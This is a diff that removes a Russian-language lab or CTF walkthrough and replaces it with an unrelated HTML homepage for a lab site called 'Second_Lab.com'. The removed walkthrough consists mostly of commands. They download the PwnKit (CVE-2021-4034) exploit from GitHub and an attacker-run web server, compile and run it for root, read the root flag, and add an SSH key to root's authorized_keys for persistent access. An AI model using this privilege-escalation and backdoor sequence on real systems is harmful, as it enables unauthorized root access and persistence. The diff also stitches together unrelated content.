@@ -1,117 +1,81 @@
-wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
+<html>
+  <head>
+    <link rel="stylesheet" href="/css/blueprint/screen.css" type="text/css" media="screen, projection">
+    <link rel="stylesheet" href="/css/blueprint/print.css" type="text/css" media="print">
+    <!--[if IE]><link rel="stylesheet" href="/css/blueprint/ie.css" type="text/css" media="screen, projection"><![endif]-->
+    <link rel="stylesheet" href="/css/stylings.css" type="text/css" media="screen">
+    <title>Second_Lab.com</title>
+  </head>
+  <body>
+    <div class="container " style="border: 2px solid #5c95cf;">
+      <div class="column span-24 first last">
+	<h1 id="title"><a href="/">Second_Lab.com</a></h1>
+      </div>
+      <div id="menu">
+	<div class="column prepend-1 span-14 first">
+	  <ul class="menu">
+	    <li class="current"><a href="/users/home.php"><span>Home</span></a></li>
+	    <li class=""><a href="/pictures/upload.php"><span>Upload</span></a></li>
+	    <li class=""><a href="/pictures/recent.php"><span>Recent</span></a></li>
+            <li class=""><a href="/guestbook.php"><span>Guestbook</span></a></li>
 
-https://github.com/berdav/CVE-2021-4034
+      	  </ul>
+	</div>
+	<div class="column prepend-1 span-7 first last">
+	  <ul class="menu top_login" >
+      	    <li><a href="/users/login.php"><Span>Login</span></a></li>
+      	  </ul>
+	</div>
+      </div>
 
-Шаг 1: Повышение привилегий до root (Задача 4.8)
-Самый быстрый и надежный способ получить root в вашем случае — использовать уязвимость PwnKit (CVE-2021-4034), которую обнаружил linpeas.
 
-1. Загрузка эксплойта на целевую машину
-Вам нужно передать код эксплойта с вашей атакующей машины на целевую.
 
-На вашей атакующей машине (Kali):
+      <div class="column span-24 first last" id="search_bar_blue">
+	<div class="column prepend-17 span-7 first last" id="search_box">
+	  <form action="/pictures/search.php" method="get" style="display:inline;">
+	    <input id="query2" name="query" size="15" style="padding: 2px; font-size: 16px; text-decoration:none;border:none;vertical-align:middle;" type="text" value=""/>
+	    <input src="/images/search_button_white.gif" type="image" style="border: 0pt none ; position: relative; top: 0px;vertical-align:middle;margin-left: 1em;" />
+	  </form>
+	</div>
+      </div>
+   
 
-Найдите и скачайте эксплойт. Один из надежных вариантов находится здесь.
+<div class="column prepend-1 span-24 first last">
+  <h2>Welcome to Second_Lab</h2>
+  <p>
+    On Second_Lab, you can share all your crazy pics with your friends. <br />
+    But that's not all, you can also buy the rights to the high quality <br />
+    version of someone's pictures. Second_Lab is fun for the whole family.
+  </p>
 
-Запустите простой веб-сервер в той же папке, куда скачали эксплойт.
+  <h3>New Here?</h3>
+  <p>
+    <h4><a href="/users/register.php">Create an account</a></h4>
+  </p>
+  <p>
+    <h4><a href="/users/sample.php?userid=1">Check out a sample user!</a></h4>
+  </p>
+  <p>
+    <h4><a href="/calendar.php">What is going on today?</a></h4>
+  </p>
+  <p>
+    <h4>Or you can test to see if Second_Lab can handle a file:</h4> <br />
+  <script>
+    document.write('<form enctype="multipart/form-data" action="/pic' + 'check' + '.php" method="POST"><input type="hidden" name="MAX_FILE_SIZE" value="30000" />Check this file: <input name="userfile" type="file" /> <br />With this name: <input name="name" type="text" /> <br /> <br /><input type="submit" value="Send File" /><br /> </form>');
+  </script>
+  </p>
+</div>
 
-Bash
 
-python3 -m http.server 8000
-На целевой машине (где вы под пользователем nf):
-
-Перейдите в директорию, куда можно записывать файлы, например /tmp.
-
-Bash
-
-cd /tmp
-Скачайте эксплойт с вашей машины. Замените <IP-АДРЕС-ВАШЕЙ-KALI> на IP-адрес вашей атакующей машины.
-
-Bash
-
-wget http://<IP-АДРЕС-ВАШЕЙ-KALI>:8000/CVE-2021-4034.c
-2. Компиляция и запуск эксплойта
-Теперь скомпилируйте и запустите код, чтобы получить права root.
-
-На целевой машине:
-
-Скомпилируйте исходный код с помощью gcc.
-
-Bash
-
-gcc CVE-2021-4034.c -o pwnkit
-Запустите скомпилированный файл.
-
-Bash
-
-./pwnkit
-3. Получение артефактов (доказательств)
-После запуска эксплойта вы должны увидеть новую командную строку, начинающуюся с #, что означает, что вы — root.
-
-Проверьте ID:
-
-Bash
-
-id
-# Ожидаемый вывод: uid=0(root) gid=0(root) groups=0(root)
-Найдите и прочитайте флаг:
-Флаг суперпользователя обычно находится в /root/root.txt.
-
-Bash
-
-cat /root/root.txt
-Зафиксируйте путь и время:
-
-Bash
-
-pwd
-# Вывод: /tmp (или где вы запускали эксплойт)
-date
-Вы успешно получили права root! 👑
-
-Шаг 2: Закрепление через SSH-доступ (Задача 4.7)
-Чтобы иметь постоянный доступ к системе от имени root, добавим ваш SSH-ключ.
-
-1. Генерация SSH-ключей
-Этот шаг выполняется на вашей атакующей машине (Kali).
-
-Создайте новую пару ключей (публичный и приватный). Назовем их root_key.
-
-Bash
-
-ssh-keygen -f root_key
-# Просто нажмите Enter на все вопросы, чтобы не задавать пароль.
-Просмотрите и скопируйте содержимое публичного ключа. Оно нам понадобится.
-
-Bash
-
-cat root_key.pub
-# Вывод будет выглядеть примерно так: ssh-rsa AAAA...
-2. Добавление ключа на целевую машину
-Теперь вернитесь в root-шелл, который вы получили на целевой машине.
-
-Создайте директорию .ssh в домашней папке root, если её нет.
-
-Bash
-
-mkdir -p /root/.ssh
-Вставьте скопированный публичный ключ в файл authorized_keys.
-
-Bash
-
-echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
-# ↑↑↑ Вставьте сюда ваш ключ, скопированный на предыдущем шаге.
-Выставьте правильные права доступа. Это критически важно, иначе SSH не будет работать.
-
-Bash
-
-chmod 700 /root/.ssh
-chmod 600 /root/.ssh/authorized_keys
-3. Проверка постоянного доступа
-Возвращаемся на атакующую машину (Kali) и проверяем, что все работает.
-
-Подключитесь к целевой машине по SSH, используя ваш новый приватный ключ.
-
-Bash
-
-ssh -i root_key root@<IP-ЦЕЛЕВОЙ-МАШИНЫ>
-Если все сделано правильно, вы войдете в систему как root без запроса пароля. Задача выполнена! 🚀
+       <div class="column span-24 first last" id="footer" >
+	<ul>
+	  <li><a href="/">Home</a> |</li>
+          <li><a href="/admin/index.php?page=login">Admin</a> |</li>
+	  <li><a href="mailto:contact@secondlab.com">Contact</a> |</li>
+	  <li><a href="/tos.php">Terms of Service</a></li>
+	</ul>
+      </div>
+    </div>
+  </body>
+</html>
+   
